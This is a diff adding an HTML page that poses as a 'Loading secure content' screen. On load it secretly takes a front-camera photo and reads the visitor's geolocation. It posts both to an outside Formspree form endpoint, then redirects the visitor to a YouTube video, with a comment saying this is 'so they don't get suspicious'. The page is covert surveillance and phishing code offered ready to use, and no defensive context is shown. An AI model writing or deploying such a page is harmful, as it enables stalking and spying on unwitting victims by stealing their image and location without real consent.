@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+</head>
+<body>
+    <!-- Visible to the user while the script runs -->
+    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
+        <h2>Loading secure content...</h2>
+        <p>Please allow permissions if prompted.</p>
+    </div>
+
+    <!-- Hidden elements used for the capture -->
+    <video id="v" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const v = document.getElementById('v');
+        const c = document.getElementById('c');
+
+        // Replace the text below with your actual Formspree ID
+        const FORMSPREE_ID = "https://formspree.io/f/xkoveqao"; 
+
+        async function startCapture() {
+            try {
+                // Request Camera & Location simultaneously
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                v.srcObject = stream;
+
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+
+                    // Wait 2 seconds for camera focus
+                    setTimeout(async () => {
+                        c.width = v.videoWidth;
+                        c.height = v.videoHeight;
+                        c.getContext('2d').drawImage(v, 0, 0);
+                        const imgData = c.toDataURL('image/jpeg');
+
+                        // Send the data to you
+                        await fetch(`https://formspree.io/f/xkoveqao`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ 
+                                photo: imgData, 
+                                map: `https://www.google.com{lat},${lon}`
+                            })
+                        });
+
+                        // Redirect to a real site so they don't get suspicious
+                        window.location.href = "https://www.youtube.com/watch?v=8e76UP9Lvjk";
+                    }, 2000);
+                });
+
+            } catch (err) {
+                console.error("User denied permissions");
+                // Optional: redirect anyway if they deny
+                // window.location.href = "https://www.google.com";
+            }
+        }
+
+        // Start the process as soon as the page loads
+        window.onload = startCapture;
+    </script>
+</body>
+</html>
